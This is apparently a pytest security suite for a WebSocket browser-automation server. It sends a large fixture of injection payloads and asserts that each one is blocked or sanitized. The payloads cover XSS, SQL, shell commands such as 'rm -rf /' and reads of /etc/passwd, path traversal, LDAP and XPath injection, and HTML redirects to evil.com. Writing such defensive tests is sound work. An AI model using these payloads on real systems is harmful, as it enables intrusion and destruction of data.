"""
Security tests for injection attack prevention.

Tests protection against JavaScript injection, SQL injection,
HTML injection, CSS injection, and other attack vectors.
"""

import pytest
import json
import asyncio
import websockets
from typing import Dict, Any, List

from aux.server.websocket_server import AUXWebSocketServer
from aux.security import SecurityManager
from aux.config import Config


@pytest.mark.security
@pytest.mark.auth
class TestInjectionAttacks:
    """Security tests for injection attack prevention."""

    @pytest.fixture
    async def security_test_server(self, test_config: Config):
        """Provide server with enhanced security for testing."""
        security_manager = SecurityManager({
            "enable_auth": True,
            "rate_limit_per_minute": 100,
            "max_session_duration": 3600,
            "allowed_origins": ["http://localhost"],
            "input_validation": "strict",
            "audit_logging": True
        })
        
        server = AUXWebSocketServer(
            config=test_config,
            security_manager=security_manager
        )
        await server.start()
        yield server
        await server.stop()

    @pytest.fixture
    def malicious_payloads(self) -> Dict[str, List[str]]:
        """Comprehensive malicious payload database."""
        return {
            "javascript_injection": [
                "<script>alert('XSS')</script>",
                "javascript:alert('XSS')",
                "onload=alert('XSS')",
                "eval('alert(1)')",
                "Function('alert(1)')()",
                "setTimeout('alert(1)', 0)",
                "setInterval('alert(1)', 1000)",
                "document.location='http://evil.com'",
                "window.open('http://evil.com')",
                "document.write('<script>alert(1)</script>')",
                "innerHTML='<img src=x onerror=alert(1)>'",
                "outerHTML='<script>alert(1)</script>'",
                "location.href='javascript:alert(1)'",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "<iframe src='javascript:alert(1)'></iframe>",
                "<%2Fscript%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E",
                "';alert('XSS');//",
                "\";alert('XSS');//",
                "';eval('alert(1)');//",
                "';document.location='http://evil.com';//"
            ],
            "css_injection": [
                "javascript:alert('XSS')",
                "data:text/html,<script>alert('XSS')</script>",
                "expression(alert('XSS'))",
                "url('javascript:alert(1)')",
                "@import 'javascript:alert(1)';",
                "background-image:url('javascript:alert(1)')",
                "list-style-image:url('javascript:alert(1)')",
                "-moz-binding:url('javascript:alert(1)')",
                "behavior:url('javascript:alert(1)')"
            ],
            "sql_injection": [
                "'; DROP TABLE users; --",
                "' OR '1'='1",
                "' OR 1=1 --",
                "'; INSERT INTO users (admin) VALUES (1); --",
                "' UNION SELECT password FROM users --",
                "'; DELETE FROM sessions WHERE 1=1; --",
                "' OR (SELECT COUNT(*) FROM users) > 0 --",
                "'; UPDATE users SET admin=1 WHERE id=1; --",
                "1; EXEC xp_cmdshell('dir'); --",
                "'; WAITFOR DELAY '00:00:05'; --"
            ],
            "html_injection": [
                "<h1>Injected HTML</h1>",
                "<form action='http://evil.com'>",
                "<meta http-equiv='refresh' content='0;url=http://evil.com'>",
                "<link rel='stylesheet' href='http://evil.com/steal.css'>",
                "<base href='http://evil.com/'>",
                "<object data='http://evil.com/malware.swf'>",
                "<embed src='http://evil.com/malware.swf'>",
                "<applet code='Malware.class' codebase='http://evil.com/'>",
                "<frameset><frame src='http://evil.com'></frameset>"
            ],
            "path_traversal": [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\config\\sam",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2f",
                "....//....//....//etc/passwd",
                "..;/..;/..;/etc/passwd",
                "..\\/..\\/..\\/windows/system32/config/sam",
                "%252e%252e%252f%252e%252e%252f%252e%252e%252f",
                "file:///etc/passwd",
                "file://c:/windows/system32/config/sam"
            ],
            "command_injection": [
                "; cat /etc/passwd",
                "| cat /etc/passwd",
                "& cat /etc/passwd",
                "&& cat /etc/passwd",
                "|| cat /etc/passwd",
                "`cat /etc/passwd`",
                "$(cat /etc/passwd)",
                "; rm -rf /",
                "| rm -rf /",
                "; shutdown -h now",
                "& format c:",
                "&& del /q /s c:\\*"
            ],
            "ldap_injection": [
                "*)(uid=*",
                "*)(|(uid=*))",
                "admin)(&(password=*))",
                "*))%00",
                "admin)(!(&(1=0))",
                "*)(cn=*)",
                "*)(objectClass=*"
            ],
            "xpath_injection": [
                "' or '1'='1",
                "' or 1=1 or ''='",
                "' or //user or ''='",
                "') or ('1'='1",
                "x' or 1=1 or 'x'='y",
                "//user[position()=1]",
                "//*[count(//*)=count(//user)]"
            ]
        }

    async def test_javascript_injection_in_selectors(
        self,
        security_test_server: AUXWebSocketServer,
        malicious_payloads: Dict[str, List[str]],
        api_key: str
    ):
        """Test JavaScript injection protection in selectors."""
        uri = f"ws://localhost:{security_test_server.port}"
        headers = {"Authorization": f"Bearer {api_key}"}
        
        async with websockets.connect(uri, extra_headers=headers) as websocket:
            for payload in malicious_payloads["javascript_injection"]:
                command = {
                    "method": "click",
                    "selector": payload
                }
                
                await websocket.send(json.dumps(command))
                response = json.loads(await websocket.recv())
                
                # Should be blocked
                assert response["status"] == "error"
                assert "SECURITY_VIOLATION" in response["error"]["error_code"] or \
                       "INVALID_SELECTOR" in response["error"]["error_code"]

    async def test_javascript_injection_in_values(
        self,
        security_test_server: AUXWebSocketServer,
        malicious_payloads: Dict[str, List[str]],
        api_key: str,
        test_websites: Dict[str, str]
    ):
        """Test JavaScript injection protection in input values."""
        uri = f"ws://localhost:{security_test_server.port}"
        headers = {"Authorization": f"Bearer {api_key}"}
        
        async with websockets.connect(uri, extra_headers=headers) as websocket:
            # First navigate to a form
            nav_command = {
                "method": "navigate",
                "url": test_websites["form"]
            }
            await websocket.send(json.dumps(nav_command))
            nav_response = json.loads(await websocket.recv())
            session_id = nav_response["session_id"]
            
            # Test malicious values
            for payload in malicious_payloads["javascript_injection"]:
                fill_command = {
                    "method": "fill",
                    "selector": "#test",
                    "value": payload,
                    "session_id": session_id
                }
                
                await websocket.send(json.dumps(fill_command))
                response = json.loads(await websocket.recv())
                
                # Should be sanitized or blocked
                assert response["status"] == "error" or \
                       (response["status"] == "success" and response["value"] != payload)

    async def test_sql_injection_protection(
        self,
        security_test_server: AUXWebSocketServer,
        malicious_payloads: Dict[str, List[str]],
        api_key: str
    ):
        """Test SQL injection protection."""
        uri = f"ws://localhost:{security_test_server.port}"
        headers = {"Authorization": f"Bearer {api_key}"}
        
        async with websockets.connect(uri, extra_headers=headers) as websocket:
            for payload in malicious_payloads["sql_injection"]:
                command = {
                    "method": "fill",
                    "selector": "#input",
                    "value": payload
                }
                
                await websocket.send(json.dumps(command))
                response = json.loads(await websocket.recv())
                
                # Should be blocked or sanitized
                assert response["status"] == "error" or \
                       (response["status"] == "success" and "DROP" not in response.get("value", ""))

    async def test_path_traversal_protection(
        self,
        security_test_server: AUXWebSocketServer,
        malicious_payloads: Dict[str, List[str]],
        api_key: str
    ):
        """Test path traversal protection in URLs."""
        uri = f"ws://localhost:{security_test_server.port}"
        headers = {"Authorization": f"Bearer {api_key}"}
        
        async with websockets.connect(uri, extra_headers=headers) as websocket:
            for payload in malicious_payloads["path_traversal"]:
                command = {
                    "method": "navigate",
                    "url": f"file://{payload}"
                }
                
                await websocket.send(json.dumps(command))
                response = json.loads(await websocket.recv())
                
                # Should be blocked
                assert response["status"] == "error"
                assert "SECURITY_VIOLATION" in response["error"]["error_code"] or \
                       "INVALID_URL" in response["error"]["error_code"]

    async def test_css_injection_protection(
        self,
        security_test_server: AUXWebSocketServer,
        malicious_payloads: Dict[str, List[str]],
        api_key: str
    ):
        """Test CSS injection protection in selectors."""
        uri = f"ws://localhost:{security_test_server.port}"
        headers = {"Authorization": f"Bearer {api_key}"}
        
        async with websockets.connect(uri, extra_headers=headers) as websocket:
            for payload in malicious_payloads["css_injection"]:
                command = {
                    "method": "click",
                    "selector": payload
                }
                
                await websocket.send(json.dumps(command))
                response = json.loads(await websocket.recv())
                
                # Should be blocked
                assert response["status"] == "error"
                assert "SECURITY_VIOLATION" in response["error"]["error_code"]

    async def test_html_injection_protection(
        self,
        security_test_server: AUXWebSocketServer,
        malicious_payloads: Dict[str, List[str]],
        api_key: str,
        test_websites: Dict[str, str]
    ):
        """Test HTML injection protection."""
        uri = f"ws://localhost:{security_test_server.port}"
        headers = {"Authorization": f"Bearer {api_key}"}
        
        async with websockets.connect(uri, extra_headers=headers) as websocket:
            # Navigate to form
            nav_command = {
                "method": "navigate",
                "url": test_websites["form"]
            }
            await websocket.send(json.dumps(nav_command))
            nav_response = json.loads(await websocket.recv())
            session_id = nav_response["session_id"]
            
            for payload in malicious_payloads["html_injection"]:
                fill_command = {
                    "method": "fill",
                    "selector": "#test",
                    "value": payload,
                    "session_id": session_id
                }
                
                await websocket.send(json.dumps(fill_command))
                response = json.loads(await websocket.recv())
                
                # Should be sanitized or blocked
                if response["status"] == "success":
                    # HTML should be encoded
                    assert "&lt;" in response["value"] or response["value"] != payload

    async def test_command_injection_protection(
        self,
        security_test_server: AUXWebSocketServer,
        malicious_payloads: Dict[str, List[str]],
        api_key: str
    ):
        """Test command injection protection."""
        uri = f"ws://localhost:{security_test_server.port}"
        headers = {"Authorization": f"Bearer {api_key}"}
        
        async with websockets.connect(uri, extra_headers=headers) as websocket:
            for payload in malicious_payloads["command_injection"]:
                command = {
                    "method": "fill",
                    "selector": "#input",
                    "value": payload
                }
                
                await websocket.send(json.dumps(command))
                response = json.loads(await websocket.recv())
                
                # Should be blocked or sanitized
                assert response["status"] == "error" or \
                       (response["status"] == "success" and "cat" not in response.get("value", ""))

    async def test_polyglot_injection_attacks(
        self,
        security_test_server: AUXWebSocketServer,
        api_key: str
    ):
        """Test polyglot injection attacks (multiple attack vectors in one payload)."""
        uri = f"ws://localhost:{security_test_server.port}"
        headers = {"Authorization": f"Bearer {api_key}"}
        
        polyglot_payloads = [
            "javascript:alert('XSS')/*--></title></style></textarea></script></xmp><svg/onload='+/'/+/onmouseover=1/+/[*/[]/+alert('XSS');//'>",
            "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
            "'><script>alert(1)</script><img src=x onerror=alert(1)>'; DROP TABLE users; --",
            "<script>alert('XSS')</script>'; UNION SELECT * FROM passwords; --",
        ]
        
        async with websockets.connect(uri, extra_headers=headers) as websocket:
            for payload in polyglot_payloads:
                command = {
                    "method": "fill",
                    "selector": "#input",
                    "value": payload
                }
                
                await websocket.send(json.dumps(command))
                response = json.loads(await websocket.recv())
                
                # Should be blocked
                assert response["status"] == "error"

    async def test_encoded_injection_attacks(
        self,
        security_test_server: AUXWebSocketServer,
        api_key: str
    ):
        """Test encoded injection attacks."""
        uri = f"ws://localhost:{security_test_server.port}"
        headers = {"Authorization": f"Bearer {api_key}"}
        
        encoded_payloads = [
            "%3Cscript%3Ealert('XSS')%3C/script%3E",  # URL encoded
            "&#60;script&#62;alert('XSS')&#60;/script&#62;",  # HTML entity encoded
            "\\x3Cscript\\x3Ealert('XSS')\\x3C/script\\x3E",  # Hex encoded
            "\\u003Cscript\\u003Ealert('XSS')\\u003C/script\\u003E",  # Unicode encoded
            "%252e%252e%252f%252e%252e%252f%252e%252e%252f",  # Double URL encoded
        ]
        
        async with websockets.connect(uri, extra_headers=headers) as websocket:
            for payload in encoded_payloads:
                command = {
                    "method": "click",
                    "selector": payload
                }
                
                await websocket.send(json.dumps(command))
                response = json.loads(await websocket.recv())
                
                # Should be blocked
                assert response["status"] == "error"

    async def test_mutation_based_attacks(
        self,
        security_test_server: AUXWebSocketServer,
        api_key: str
    ):
        """Test mutation-based attacks that try to bypass filters."""
        uri = f"ws://localhost:{security_test_server.port}"
        headers = {"Authorization": f"Bearer {api_key}"}
        
        mutation_payloads = [
            "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
            "java\x00script:alert('XSS')",
            "java\tscript:alert('XSS')",
            "java\rscript:alert('XSS')",
            "java\nscript:alert('XSS')",
            "<img src=\"javascript:alert('XSS')\">",
            "<svg><script>alert('XSS')</script></svg>",
            "<math><script>alert('XSS')</script></math>",
        ]
        
        async with websockets.connect(uri, extra_headers=headers) as websocket:
            for payload in mutation_payloads:
                command = {
                    "method": "fill",
                    "selector": "#input",
                    "value": payload
                }
                
                await websocket.send(json.dumps(command))
                response = json.loads(await websocket.recv())
                
                # Should be blocked or properly sanitized
                assert response["status"] == "error" or \
                       (response["status"] == "success" and "script" not in response.get("value", "").lower())

    async def test_timing_attack_protection(
        self,
        security_test_server: AUXWebSocketServer,
        api_key: str
    ):
        """Test protection against timing attacks."""
        uri = f"ws://localhost:{security_test_server.port}"
        headers = {"Authorization": f"Bearer {api_key}"}
        
        async with websockets.connect(uri, extra_headers=headers) as websocket:
            # Send multiple requests with malicious content
            timings = []
            
            for i in range(10):
                start_time = asyncio.get_event_loop().time()
                
                command = {
                    "method": "fill",
                    "selector": "#input",
                    "value": f"<script>alert('timing-{i}')</script>"
                }
                
                await websocket.send(json.dumps(command))
                response = json.loads(await websocket.recv())
                
                end_time = asyncio.get_event_loop().time()
                timings.append(end_time - start_time)
                
                # Should be consistently blocked
                assert response["status"] == "error"
            
            # Response times should be consistent (no timing leak)
            avg_time = sum(timings) / len(timings)
            for timing in timings:
                # Allow 50% variance to account for network jitter
                assert abs(timing - avg_time) / avg_time < 0.5

    async def test_input_length_attack_protection(
        self,
        security_test_server: AUXWebSocketServer,
        api_key: str
    ):
        """Test protection against oversized input attacks."""
        uri = f"ws://localhost:{security_test_server.port}"
        headers = {"Authorization": f"Bearer {api_key}"}
        
        async with websockets.connect(uri, extra_headers=headers) as websocket:
            # Test various oversized inputs
            oversized_inputs = [
                "A" * 10000,   # 10KB
                "B" * 100000,  # 100KB
                "C" * 1000000, # 1MB
            ]
            
            for payload in oversized_inputs:
                command = {
                    "method": "fill",
                    "selector": "#input",
                    "value": payload
                }
                
                await websocket.send(json.dumps(command))
                response = json.loads(await websocket.recv())
                
                # Should be blocked due to size
                assert response["status"] == "error"
                assert "INPUT_TOO_LARGE" in response["error"]["error_code"] or \
                       "VALIDATION_ERROR" in response["error"]["error_code"]